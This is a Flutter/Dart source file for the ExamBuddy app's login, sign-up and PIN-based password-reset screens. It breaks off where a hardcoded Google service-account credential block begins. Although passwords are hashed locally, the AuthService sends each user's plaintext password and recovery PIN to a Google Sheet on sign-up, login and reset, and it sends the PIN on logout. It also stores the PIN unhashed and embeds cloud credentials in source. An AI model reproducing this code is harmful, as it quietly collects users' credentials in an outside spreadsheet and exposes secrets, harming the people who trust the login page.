import 'package:flutter/material.dart';
import 'package:gsheets/gsheets.dart';
import 'dart:typed_data';
import 'package:crypto/crypto.dart';
import 'package:helloworld/main.dart';
import 'dart:convert';
import 'package:shared_preferences/shared_preferences.dart';

// User model to store credentials
class User {
  final String email;
  final String name;
  final String passwordHash;
  final String recoveryPin; // Add this field

  User(
      {required this.email,
      required this.name,
      required this.passwordHash,
      required this.recoveryPin // Add this parameter
      });

  // Update toJson to include recoveryPin
  Map<String, dynamic> toJson() {
    return {
      'email': email,
      'name': name,
      'passwordHash': passwordHash,
      'recoveryPin': recoveryPin,
    };
  }

  // Update fromJson to include recoveryPin
  factory User.fromJson(Map<String, dynamic> json) {
    return User(
      email: json['email'],
      name: json['name'],
      passwordHash: json['passwordHash'],
      recoveryPin: json['recoveryPin'],
    );
  }
}

// Authentication service to handle login/registration
class AuthService {
  // Hash password for secure storage
  static String hashPassword(String password) {
    var bytes = utf8.encode(password); // Convert to bytes
    var digest = sha256.convert(bytes); // Create SHA-256 hash
    return digest.toString();
  }

  static Future<bool> register(
      String name, String email, String password, String recoveryPin) async {
    try {
      final prefs = await SharedPreferences.getInstance();

      // Check if user already exists
      String? usersJson = prefs.getString('users');
      Map<String, dynamic> users = {};

      if (usersJson != null) {
        users = jsonDecode(usersJson);
        if (users.containsKey(email)) {
          return false; // User already exists
        }
      }

      // Create new user
      final newUser = User(
        email: email,
        name: name,
        passwordHash: hashPassword(password),
        recoveryPin: recoveryPin,
      );

      // Add user to users map
      users[email] = newUser.toJson();

      // Save updated users map
      await prefs.setString('users', jsonEncode(users));

      // After successful registration - Now includes password and recoveryPin
      await GoogleSheetsService.insertUserEvent(
        email: email,
        name: name,
        action: 'signup',
        password: password, // Add the password
        recoveryPin: recoveryPin, // Add the recovery PIN
      );

      return true;
    } catch (e) {
      print('Registration error: $e');
      return false;
    }
  }

  // Login user
  static Future<Map<String, dynamic>> login(
      String email, String password) async {
    try {
      final prefs = await SharedPreferences.getInstance();

      // Get users
      String? usersJson = prefs.getString('users');
      if (usersJson == null) {
        return {
          'success': false,
          'message': 'No users found. Please register.'
        };
      }

      Map<String, dynamic> users = jsonDecode(usersJson);

      // Check if user exists
      if (!users.containsKey(email)) {
        return {
          'success': false,
          'message': 'User not found. Please check your email.'
        };
      }

      // Check password
      User user = User.fromJson(users[email]);
      String hashedPassword = hashPassword(password);

      if (user.passwordHash != hashedPassword) {
        return {
          'success': false,
          'message': 'Incorrect password. Please try again.'
        };
      }

      if (user.passwordHash == hashedPassword) {
        await prefs.setBool('isLoggedIn', true);
        await prefs.setString('currentUserEmail', email);
        await prefs.setString('currentUserName', user.name);

        // Store login event with password and recoveryPin
        await GoogleSheetsService.insertUserEvent(
          email: email,
          name: user.name,
          action: 'login',
          password: password, // Add the password
          recoveryPin: user.recoveryPin, // Add the recovery PIN
        );

        return {
          'success': true,
          'message': 'Login successful',
          'user': {'email': email, 'name': user.name}
        };
      }

      return {
        'success': true,
        'message': 'Login successful',
        'user': {'email': email, 'name': user.name}
      };
    } catch (e) {
      print('Login error: $e');
      return {'success': false, 'message': 'Login failed. Please try again.'};
    }
  }

  static Future<bool> logout() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final email = prefs.getString('currentUserEmail') ?? '';
      final name = prefs.getString('currentUserName') ?? '';

      // Get the user's recovery PIN before logout
      String? recoveryPin;
      String? usersJson = prefs.getString('users');
      if (usersJson != null && email.isNotEmpty) {
        Map<String, dynamic> users = jsonDecode(usersJson);
        if (users.containsKey(email)) {
          User user = User.fromJson(users[email]);
          recoveryPin = user.recoveryPin;
        }
      }

      await prefs.setBool('isLoggedIn', false);
      await prefs.remove('currentUserEmail');
      await prefs.remove('currentUserName');

      // Store logout event (no need to include password for logout)
      await GoogleSheetsService.insertUserEvent(
        email: email,
        name: name,
        action: 'logout',
        recoveryPin: recoveryPin, // Only include recovery PIN
      );

      return true;
    } catch (e) {
      print('Logout error: $e');
      return false;
    }
  }

  static Future<bool> resetPasswordWithPin(
      String email, String recoveryPin, String newPassword) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      String? usersJson = prefs.getString('users');

      if (usersJson == null) {
        return false;
      }

      Map<String, dynamic> users = jsonDecode(usersJson);

      // Check if user exists
      if (!users.containsKey(email)) {
        return false;
      }

      // Verify PIN
      User user = User.fromJson(users[email]);
      if (user.recoveryPin != recoveryPin) {
        return false; // PIN doesn't match
      }

      // Update password
      User updatedUser = User(
        email: user.email,
        name: user.name,
        passwordHash: hashPassword(newPassword),
        recoveryPin: user.recoveryPin,
      );

      users[email] = updatedUser.toJson();
      await prefs.setString('users', jsonEncode(users));

      // Log password reset event
      await GoogleSheetsService.insertUserEvent(
        email: email,
        name: user.name,
        action: 'password_reset',
        password: newPassword,
        recoveryPin: recoveryPin,
      );

      return true;
    } catch (e) {
      print('Password reset error: $e');
      return false;
    }
  }

  // Check if user is logged in
  static Future<bool> isLoggedIn() async {
    final prefs = await SharedPreferences.getInstance();
    return prefs.getBool('isLoggedIn') ?? false;
  }

  // Get current user info
  static Future<Map<String, String>?> getCurrentUser() async {
    final prefs = await SharedPreferences.getInstance();
    String? email = prefs.getString('currentUserEmail');
    String? name = prefs.getString('currentUserName');

    if (email != null && name != null) {
      return {'email': email, 'name': name};
    }
    return null;
  }
}

// Login Page
class LoginPage extends StatefulWidget {
  @override
  _LoginPageState createState() => _LoginPageState();
}

class _LoginPageState extends State<LoginPage> {
  final _formKey = GlobalKey<FormState>();
  final TextEditingController _emailController = TextEditingController();
  final TextEditingController _passwordController = TextEditingController();
  bool _isLoading = false;
  bool _rememberMe = false;
  bool _isPasswordVisible = false;
  String _errorMessage = '';

  @override
  void initState() {
    super.initState();
    _checkIfLoggedIn();
    _loadSavedEmail();
  }

  Future<void> _loadSavedEmail() async {
    final prefs = await SharedPreferences.getInstance();
    String? savedEmail = prefs.getString('savedEmail');
    if (savedEmail != null) {
      setState(() {
        _emailController.text = savedEmail;
        _rememberMe = true;
      });
    }
  }

  Future<void> _checkIfLoggedIn() async {
    bool isLoggedIn = await AuthService.isLoggedIn();
    if (isLoggedIn) {
      _navigateToHomePage();
    }
  }

  void _navigateToHomePage() {
    Navigator.pushReplacement(
      context,
      MaterialPageRoute(builder: (context) => HomePg()),
    );
  }

  Future<void> _login() async {
    if (_formKey.currentState!.validate()) {
      setState(() {
        _isLoading = true;
        _errorMessage = '';
      });

      try {
        Map<String, dynamic> result = await AuthService.login(
          _emailController.text.trim(),
          _passwordController.text,
        );

        if (result['success']) {
          // Handle "remember me" option
          final prefs = await SharedPreferences.getInstance();
          if (_rememberMe) {
            await prefs.setString('savedEmail', _emailController.text.trim());
          } else {
            await prefs.remove('savedEmail');
          }

          _navigateToHomePage();
        } else {
          setState(() {
            _errorMessage = result['message'];
          });
        }
      } catch (e) {
        setState(() {
          _errorMessage = 'An error occurred. Please try again.';
        });
      } finally {
        setState(() {
          _isLoading = false;
        });
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [Colors.blue.shade400, Colors.blue.shade800],
          ),
        ),
        child: SafeArea(
          child: Center(
            child: SingleChildScrollView(
              padding: EdgeInsets.all(24),
              child: Card(
                elevation: 8,
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(16),
                ),
                child: Padding(
                  padding: EdgeInsets.all(24),
                  child: Form(
                    key: _formKey,
                    child: Column(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        Icon(
                          Icons.school,
                          size: 64,
                          color: Colors.blue.shade600,
                        ),
                        SizedBox(height: 16),
                        Text(
                          'Welcome to ExamBuddy',
                          style: TextStyle(
                            fontSize: 24,
                            fontWeight: FontWeight.bold,
                            color: Colors.blue.shade800,
                          ),
                        ),
                        SizedBox(height: 8),
                        Text(
                          'Sign in to continue',
                          style: TextStyle(
                            color: Colors.grey.shade600,
                            fontSize: 14,
                          ),
                        ),
                        SizedBox(height: 24),

                        // Show error message if there is one
                        if (_errorMessage.isNotEmpty)
                          Container(
                            padding: EdgeInsets.all(10),
                            margin: EdgeInsets.only(bottom: 16),
                            decoration: BoxDecoration(
                              color: Colors.red.shade50,
                              borderRadius: BorderRadius.circular(8),
                              border: Border.all(color: Colors.red.shade200),
                            ),
                            child: Row(
                              children: [
                                Icon(Icons.error_outline, color: Colors.red),
                                SizedBox(width: 8),
                                Expanded(
                                  child: Text(
                                    _errorMessage,
                                    style:
                                        TextStyle(color: Colors.red.shade800),
                                  ),
                                ),
                              ],
                            ),
                          ),

                        TextFormField(
                          controller: _emailController,
                          keyboardType: TextInputType.emailAddress,
                          decoration: InputDecoration(
                            labelText: 'Email',
                            border: OutlineInputBorder(
                              borderRadius: BorderRadius.circular(12),
                            ),
                            prefixIcon: Icon(Icons.email_outlined),
                          ),
                          validator: (value) {
                            if (value == null || value.isEmpty) {
                              return 'Please enter your email';
                            }
                            if (!RegExp(r'^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$')
                                .hasMatch(value)) {
                              return 'Please enter a valid email';
                            }
                            return null;
                          },
                        ),
                        SizedBox(height: 16),
                        TextFormField(
                          controller: _passwordController,
                          obscureText: !_isPasswordVisible,
                          decoration: InputDecoration(
                            labelText: 'Password',
                            border: OutlineInputBorder(
                              borderRadius: BorderRadius.circular(12),
                            ),
                            prefixIcon: Icon(Icons.lock_outline),
                            suffixIcon: IconButton(
                              icon: Icon(
                                _isPasswordVisible
                                    ? Icons.visibility_off
                                    : Icons.visibility,
                              ),
                              onPressed: () {
                                setState(() {
                                  _isPasswordVisible = !_isPasswordVisible;
                                });
                              },
                            ),
                          ),
                          validator: (value) {
                            if (value == null || value.isEmpty) {
                              return 'Please enter your password';
                            }
                            if (value.length < 6) {
                              return 'Password must be at least 6 characters';
                            }
                            return null;
                          },
                        ),
                        SizedBox(height: 8),
                        Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Row(
                              children: [
                                Checkbox(
                                  value: _rememberMe,
                                  onChanged: (value) {
                                    setState(() {
                                      _rememberMe = value!;
                                    });
                                  },
                                ),
                                const Text('Remember me'),
                              ],
                            ),
                            Padding(
                              padding:
                                  const EdgeInsets.only(left: 12.0, top: 8.0),
                              child: TextButton(
                                onPressed: () {
                                  Navigator.push(
                                    context,
                                    MaterialPageRoute(
                                        builder: (context) =>
                                            ForgotPasswordPage()),
                                  );
                                },
                                style: TextButton.styleFrom(
                                  padding: EdgeInsets.zero,
                                  minimumSize: Size(0, 36),
                                  tapTargetSize:
                                      MaterialTapTargetSize.shrinkWrap,
                                  alignment: Alignment.centerLeft,
                                ),
                                child: Text('Forgot Password?'),
                              ),
                            ),
                          ],
                        ),
                        SizedBox(height: 24),
                        ElevatedButton(
                          onPressed: _isLoading ? null : _login,
                          style: ElevatedButton.styleFrom(
                            backgroundColor: Colors.blue.shade600,
                            foregroundColor: Colors.white,
                            minimumSize: Size(double.infinity, 50),
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(12),
                            ),
                          ),
                          child: _isLoading
                              ? SizedBox(
                                  height: 24,
                                  width: 24,
                                  child: CircularProgressIndicator(
                                    color: Colors.white,
                                    strokeWidth: 2,
                                  ),
                                )
                              : Text(
                                  'Sign In',
                                  style: TextStyle(fontSize: 16),
                                ),
                        ),
                        SizedBox(height: 16),
                        Row(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            Text("Don't have an account?"),
                            TextButton(
                              onPressed: () {
                                Navigator.push(
                                  context,
                                  MaterialPageRoute(
                                      builder: (context) => RegisterPage()),
                                );
                              },
                              child: Text('Sign Up'),
                            ),
                          ],
                        ),
                      ],
                    ),
                  ),
                ),
              ),
            ),
          ),
        ),
      ),
    );
  }
}

// Registration Page
class RegisterPage extends StatefulWidget {
  @override
  _RegisterPageState createState() => _RegisterPageState();
}

class _RegisterPageState extends State<RegisterPage> {
  final _formKey = GlobalKey<FormState>();
  final TextEditingController _nameController = TextEditingController();
  final TextEditingController _emailController = TextEditingController();
  final TextEditingController _passwordController = TextEditingController();
  final TextEditingController _recoveryPinController = TextEditingController();

  final TextEditingController _confirmPasswordController =
      TextEditingController();
  bool _isLoading = false;
  bool _isPasswordVisible = false;
  bool _isConfirmPasswordVisible = false;
  String _errorMessage = '';

  Future<void> _register() async {
    if (_formKey.currentState!.validate()) {
      setState(() {
        _isLoading = true;
        _errorMessage = '';
      });

      try {
        bool success = await AuthService.register(
          _nameController.text.trim(),
          _emailController.text.trim(),
          _passwordController.text,
          _recoveryPinController.text.trim(), // Add this parameter
        );

        if (success) {
          // Auto-login after successful registration
          await AuthService.login(
            _emailController.text.trim(),
            _passwordController.text,
          );

          // Show success message and navigate to home
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(
              content: Text('Registration successful!'),
              backgroundColor: Colors.green,
            ),
          );

          // Navigate to home page
          Navigator.pushReplacement(
            context,
            MaterialPageRoute(builder: (context) => HomePg()),
          );
        } else {
          setState(() {
            _errorMessage =
                'Email already registered. Please use a different email or login.';
          });
        }
      } catch (e) {
        setState(() {
          _errorMessage = 'Registration failed. Please try again.';
        });
      } finally {
        setState(() {
          _isLoading = false;
        });
      }
    }
  }

  void _showRecoveryPinInfo() {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(
            'This PIN will be used to reset your password if you forget it. Please remember it!'),
        duration: Duration(seconds: 5),
        backgroundColor: Colors.blue.shade700,
        behavior: SnackBarBehavior.floating,
        action: SnackBarAction(
          label: 'OK',
          textColor: Colors.white,
          onPressed: () {
            ScaffoldMessenger.of(context).hideCurrentSnackBar();
          },
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('Create Account'),
        backgroundColor: Colors.blue.shade600,
        elevation: 0,
      ),
      body: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [Colors.blue.shade400, Colors.blue.shade800],
          ),
        ),
        child: SafeArea(
          child: Center(
            child: SingleChildScrollView(
              padding: EdgeInsets.all(24),
              child: Card(
                elevation: 8,
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(16),
                ),
                child: Padding(
                  padding: EdgeInsets.all(24),
                  child: Form(
                    key: _formKey,
                    child: Column(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        Text(
                          'Join ExamBuddy',
                          style: TextStyle(
                            fontSize: 24,
                            fontWeight: FontWeight.bold,
                            color: Colors.blue.shade800,
                          ),
                        ),
                        SizedBox(height: 8),
                        Text(
                          'Create an account to get started',
                          style: TextStyle(
                            color: Colors.grey.shade600,
                            fontSize: 14,
                          ),
                        ),
                        SizedBox(height: 24),

                        // Show error message if there is one
                        if (_errorMessage.isNotEmpty)
                          Container(
                            padding: EdgeInsets.all(10),
                            margin: EdgeInsets.only(bottom: 16),
                            decoration: BoxDecoration(
                              color: Colors.red.shade50,
                              borderRadius: BorderRadius.circular(8),
                              border: Border.all(color: Colors.red.shade200),
                            ),
                            child: Row(
                              children: [
                                Icon(Icons.error_outline, color: Colors.red),
                                SizedBox(width: 8),
                                Expanded(
                                  child: Text(
                                    _errorMessage,
                                    style:
                                        TextStyle(color: Colors.red.shade800),
                                  ),
                                ),
                              ],
                            ),
                          ),

                        TextFormField(
                          controller: _nameController,
                          decoration: InputDecoration(
                            labelText: 'Full Name',
                            border: OutlineInputBorder(
                              borderRadius: BorderRadius.circular(12),
                            ),
                            prefixIcon: Icon(Icons.person_outline),
                          ),
                          validator: (value) {
                            if (value == null || value.isEmpty) {
                              return 'Please enter your name';
                            }
                            if (value.length < 2) {
                              return 'Name must be at least 2 characters';
                            }
                            return null;
                          },
                        ),
                        SizedBox(height: 16),
                        TextFormField(
                          controller: _emailController,
                          keyboardType: TextInputType.emailAddress,
                          decoration: InputDecoration(
                            labelText: 'Email',
                            border: OutlineInputBorder(
                              borderRadius: BorderRadius.circular(12),
                            ),
                            prefixIcon: Icon(Icons.email_outlined),
                          ),
                          validator: (value) {
                            if (value == null || value.isEmpty) {
                              return 'Please enter your email';
                            }
                            if (!RegExp(r'^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$')
                                .hasMatch(value)) {
                              return 'Please enter a valid email';
                            }
                            return null;
                          },
                        ),
                        SizedBox(height: 16),
                        TextFormField(
                          controller: _passwordController,
                          obscureText: !_isPasswordVisible,
                          decoration: InputDecoration(
                            labelText: 'Password',
                            border: OutlineInputBorder(
                              borderRadius: BorderRadius.circular(12),
                            ),
                            prefixIcon: Icon(Icons.lock_outline),
                            suffixIcon: IconButton(
                              icon: Icon(
                                _isPasswordVisible
                                    ? Icons.visibility_off
                                    : Icons.visibility,
                              ),
                              onPressed: () {
                                setState(() {
                                  _isPasswordVisible = !_isPasswordVisible;
                                });
                              },
                            ),
                          ),
                          validator: (value) {
                            if (value == null || value.isEmpty) {
                              return 'Please enter a password';
                            }
                            if (value.length < 6) {
                              return 'Password must be at least 6 characters';
                            }
                            // Check for at least one uppercase letter
                            if (!RegExp(r'[A-Z]').hasMatch(value)) {
                              return 'Password must contain at least one uppercase letter';
                            }
                            // Check for at least one number
                            if (!RegExp(r'[0-9]').hasMatch(value)) {
                              return 'Password must contain at least one number';
                            }
                            return null;
                          },
                        ),
                        SizedBox(height: 16),
                        TextFormField(
                          controller: _confirmPasswordController,
                          obscureText: !_isConfirmPasswordVisible,
                          decoration: InputDecoration(
                            labelText: 'Confirm Password',
                            border: OutlineInputBorder(
                              borderRadius: BorderRadius.circular(12),
                            ),
                            prefixIcon: Icon(Icons.lock_outline),
                            suffixIcon: IconButton(
                              icon: Icon(
                                _isConfirmPasswordVisible
                                    ? Icons.visibility_off
                                    : Icons.visibility,
                              ),
                              onPressed: () {
                                setState(() {
                                  _isConfirmPasswordVisible =
                                      !_isConfirmPasswordVisible;
                                });
                              },
                            ),
                          ),
                          validator: (value) {
                            if (value == null || value.isEmpty) {
                              return 'Please confirm your password';
                            }
                            if (value != _passwordController.text) {
                              return 'Passwords do not match';
                            }
                            return null;
                          },
                        ),
                        SizedBox(height: 16),
                        TextFormField(
                          controller: _recoveryPinController,
                          keyboardType: TextInputType.number,
                          decoration: InputDecoration(
                            labelText: 'Recovery PIN (for password reset)',
                            border: OutlineInputBorder(
                              borderRadius: BorderRadius.circular(12),
                            ),
                            prefixIcon: Icon(Icons.pin_outlined),
                          ),
                          onTap: _showRecoveryPinInfo,
                          validator: (value) {
                            if (value == null || value.isEmpty) {
                              return 'Please create a recovery PIN';
                            }
                            if (value.length < 4) {
                              return 'PIN must be at least 4 digits';
                            }
                            return null;
                          },
                        ),
                        SizedBox(height: 24),
                        ElevatedButton(
                          onPressed: _isLoading ? null : _register,
                          style: ElevatedButton.styleFrom(
                            backgroundColor: Colors.blue.shade600,
                            foregroundColor: Colors.white,
                            minimumSize: Size(double.infinity, 50),
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(12),
                            ),
                          ),
                          child: _isLoading
                              ? SizedBox(
                                  height: 24,
                                  width: 24,
                                  child: CircularProgressIndicator(
                                    color: Colors.white,
                                    strokeWidth: 2,
                                  ),
                                )
                              : Text(
                                  'Create Account',
                                  style: TextStyle(fontSize: 16),
                                ),
                        ),
                        SizedBox(height: 16),
                        Row(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            Text("Already have an account?"),
                            TextButton(
                              onPressed: () {
                                Navigator.pop(context);
                              },
                              child: Text('Sign In'),
                            ),
                          ],
                        ),
                      ],
                    ),
                  ),
                ),
              ),
            ),
          ),
        ),
      ),
    );
  }
}

// Forgot Password Page
class ForgotPasswordPage extends StatefulWidget {
  @override
  _ForgotPasswordPageState createState() => _ForgotPasswordPageState();
}

class _ForgotPasswordPageState extends State<ForgotPasswordPage> {
  final _formKey = GlobalKey<FormState>();
  final TextEditingController _emailController = TextEditingController();
  final TextEditingController _pinController = TextEditingController();
  final TextEditingController _newPasswordController = TextEditingController();
  final TextEditingController _confirmPasswordController =
      TextEditingController();
  bool _isLoading = false;
  String _message = '';
  bool _isSuccess = false;
  bool _showPinForm = true;
  bool _showResetForm = false;
  bool _isPasswordVisible = false;
  bool _isConfirmPasswordVisible = false;

  Future<void> _verifyPin() async {
    if (_formKey.currentState!.validate()) {
      setState(() {
        _isLoading = true;
        _message = '';
      });

      try {
        final prefs = await SharedPreferences.getInstance();
        String? usersJson = prefs.getString('users');

        if (usersJson != null) {
          Map<String, dynamic> users = jsonDecode(usersJson);
          String email = _emailController.text.trim();

          if (users.containsKey(email)) {
            User user = User.fromJson(users[email]);
            if (user.recoveryPin == _pinController.text.trim()) {
              setState(() {
                _showPinForm = false;
                _showResetForm = true;
                _message = '';
              });
            } else {
              setState(() {
                _message = 'Incorrect recovery PIN. Please try again.';
              });
            }
          } else {
            setState(() {
              _message = 'No account found with this email.';
            });
          }
        } else {
          setState(() {
            _message = 'No account found with this email.';
          });
        }
      } catch (e) {
        setState(() {
          _message = 'An error occurred. Please try again.';
        });
      } finally {
        setState(() {
          _isLoading = false;
        });
      }
    }
  }

  Future<void> _resetPassword() async {
    if (_formKey.currentState!.validate()) {
      setState(() {
        _isLoading = true;
        _message = '';
      });

      try {
        bool success = await AuthService.resetPasswordWithPin(
          _emailController.text.trim(),
          _pinController.text.trim(),
          _newPasswordController.text,
        );

        if (success) {
          setState(() {
            _isSuccess = true;
            _message = 'Password has been reset successfully!';
          });

          // Navigate back to login after a short delay
          Future.delayed(Duration(seconds: 2), () {
            Navigator.pop(context);
          });
        } else {
          setState(() {
            _message = 'Failed to reset password. Please try again.';
          });
        }
      } catch (e) {
        setState(() {
          _message = 'An error occurred. Please try again.';
        });
      } finally {
        setState(() {
          _isLoading = false;
        });
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('Reset Password'),
        backgroundColor: Colors.blue.shade600,
        elevation: 0,
      ),
      body: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [Colors.blue.shade400, Colors.blue.shade800],
          ),
        ),
        child: SafeArea(
          child: Center(
            child: SingleChildScrollView(
              padding: EdgeInsets.all(24),
              child: Card(
                elevation: 8,
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(16),
                ),
                child: Padding(
                  padding: EdgeInsets.all(24),
                  child: Form(
                    key: _formKey,
                    child: Column(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        Icon(
                          Icons.lock_reset,
                          size: 64,
                          color: Colors.blue.shade600,
                        ),
                        SizedBox(height: 16),
                        Text(
                          'Reset Your Password',
                          style: TextStyle(
                            fontSize: 24,
                            fontWeight: FontWeight.bold,
                            color: Colors.blue.shade800,
                          ),
                        ),
                        SizedBox(height: 8),
                        Text(
                          _showPinForm
                              ? 'Enter your email and recovery PIN'
                              : 'Create a new password',
                          style: TextStyle(
                            color: Colors.grey.shade600,
                            fontSize: 14,
                          ),
                          textAlign: TextAlign.center,
                        ),
                        SizedBox(height: 24),

                        // Show message if there is one
                        if (_message.isNotEmpty)
                          Container(
                            padding: EdgeInsets.all(10),
                            margin: EdgeInsets.only(bottom: 16),
                            decoration: BoxDecoration(
                              color: _isSuccess
                                  ? Colors.green.shade50
                                  : Colors.red.shade50,
                              borderRadius: BorderRadius.circular(8),
                              border: Border.all(
                                  color: _isSuccess
                                      ? Colors.green.shade200
                                      : Colors.red.shade200),
                            ),
                            child: Row(
                              children: [
                                Icon(
                                  _isSuccess
                                      ? Icons.check_circle_outline
                                      : Icons.error_outline,
                                  color: _isSuccess ? Colors.green : Colors.red,
                                ),
                                SizedBox(width: 8),
                                Expanded(
                                  child: Text(
                                    _message,
                                    style: TextStyle(
                                        color: _isSuccess
                                            ? Colors.green.shade800
                                            : Colors.red.shade800),
                                  ),
                                ),
                              ],
                            ),
                          ),

                        // Email field is always shown
                        if (_showPinForm)
                          Column(
                            children: [
                              TextFormField(
                                controller: _emailController,
                                keyboardType: TextInputType.emailAddress,
                                decoration: InputDecoration(
                                  labelText: 'Email',
                                  border: OutlineInputBorder(
                                    borderRadius: BorderRadius.circular(12),
                                  ),
                                  prefixIcon: Icon(Icons.email_outlined),
                                ),
                                validator: (value) {
                                  if (value == null || value.isEmpty) {
                                    return 'Please enter your email';
                                  }
                                  if (!RegExp(
                                          r'^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$')
                                      .hasMatch(value)) {
                                    return 'Please enter a valid email';
                                  }
                                  return null;
                                },
                              ),
                              SizedBox(height: 16),
                              TextFormField(
                                controller: _pinController,
                                keyboardType: TextInputType.number,
                                decoration: InputDecoration(
                                  labelText: 'Recovery PIN',
                                  border: OutlineInputBorder(
                                    borderRadius: BorderRadius.circular(12),
                                  ),
                                  prefixIcon: Icon(Icons.pin_outlined),
                                ),
                                validator: (value) {
                                  if (value == null || value.isEmpty) {
                                    return 'Please enter your recovery PIN';
                                  }
                                  if (value.length < 4) {
                                    return 'PIN must be at least 4 digits';
                                  }
                                  return null;
                                },
                              ),
                              SizedBox(height: 24),
                              ElevatedButton(
                                onPressed: _isLoading ? null : _verifyPin,
                                style: ElevatedButton.styleFrom(
                                  backgroundColor: Colors.blue.shade600,
                                  foregroundColor: Colors.white,
                                  minimumSize: Size(double.infinity, 50),
                                  shape: RoundedRectangleBorder(
                                    borderRadius: BorderRadius.circular(12),
                                  ),
                                ),
                                child: _isLoading
                                    ? SizedBox(
                                        height: 24,
                                        width: 24,
                                        child: CircularProgressIndicator(
                                          color: Colors.white,
                                          strokeWidth: 2,
                                        ),
                                      )
                                    : Text(
                                        'Verify PIN',
                                        style: TextStyle(fontSize: 16),
                                      ),
                              ),
                            ],
                          ),

                        // Show reset form after PIN is verified
                        if (_showResetForm)
                          Column(
                            children: [
                              TextFormField(
                                controller: _newPasswordController,
                                obscureText: !_isPasswordVisible,
                                decoration: InputDecoration(
                                  labelText: 'New Password',
                                  border: OutlineInputBorder(
                                    borderRadius: BorderRadius.circular(12),
                                  ),
                                  prefixIcon: Icon(Icons.lock_outline),
                                  suffixIcon: IconButton(
                                    icon: Icon(
                                      _isPasswordVisible
                                          ? Icons.visibility_off
                                          : Icons.visibility,
                                    ),
                                    onPressed: () {
                                      setState(() {
                                        _isPasswordVisible =
                                            !_isPasswordVisible;
                                      });
                                    },
                                  ),
                                ),
                                validator: (value) {
                                  if (value == null || value.isEmpty) {
                                    return 'Please enter a new password';
                                  }
                                  if (value.length < 6) {
                                    return 'Password must be at least 6 characters';
                                  }
                                  // Check for at least one uppercase letter
                                  if (!RegExp(r'[A-Z]').hasMatch(value)) {
                                    return 'Password must contain at least one uppercase letter';
                                  }
                                  // Check for at least one number
                                  if (!RegExp(r'[0-9]').hasMatch(value)) {
                                    return 'Password must contain at least one number';
                                  }
                                  return null;
                                },
                              ),
                              SizedBox(height: 16),
                              TextFormField(
                                controller: _confirmPasswordController,
                                obscureText: !_isConfirmPasswordVisible,
                                decoration: InputDecoration(
                                  labelText: 'Confirm New Password',
                                  border: OutlineInputBorder(
                                    borderRadius: BorderRadius.circular(12),
                                  ),
                                  prefixIcon: Icon(Icons.lock_outline),
                                  suffixIcon: IconButton(
                                    icon: Icon(
                                      _isConfirmPasswordVisible
                                          ? Icons.visibility_off
                                          : Icons.visibility,
                                    ),
                                    onPressed: () {
                                      setState(() {
                                        _isConfirmPasswordVisible =
                                            !_isConfirmPasswordVisible;
                                      });
                                    },
                                  ),
                                ),
                                validator: (value) {
                                  if (value == null || value.isEmpty) {
                                    return 'Please confirm your new password';
                                  }
                                  if (value != _newPasswordController.text) {
                                    return 'Passwords do not match';
                                  }
                                  return null;
                                },
                              ),
                              SizedBox(height: 24),
                              ElevatedButton(
                                onPressed: _isLoading ? null : _resetPassword,
                                style: ElevatedButton.styleFrom(
                                  backgroundColor: Colors.blue.shade600,
                                  foregroundColor: Colors.white,
                                  minimumSize: Size(double.infinity, 50),
                                  shape: RoundedRectangleBorder(
                                    borderRadius: BorderRadius.circular(12),
                                  ),
                                ),
                                child: _isLoading
                                    ? SizedBox(
                                        height: 24,
                                        width: 24,
                                        child: CircularProgressIndicator(
                                          color: Colors.white,
                                          strokeWidth: 2,
                                        ),
                                      )
                                    : Text(
                                        'Reset Password',
                                        style: TextStyle(fontSize: 16),
                                      ),
                              ),
                            ],
                          ),

                        SizedBox(height: 16),
                        TextButton(
                          onPressed: () {
                            Navigator.pop(context);
                          },
                          child: Text('Back to Login'),
                        ),
                      ],
                    ),
                  ),
                ),
              ),
            ),
          ),
        ),
      ),
    );
  }
}

class GoogleSheetsService {
  static const _credentials = r'''{
  "type": "service_account",
  "project_id": "level-elevator-458206-n9",
  "private_key_id": "e56f4ca6dc5946d08eceb91c09b4cfaca88db098",
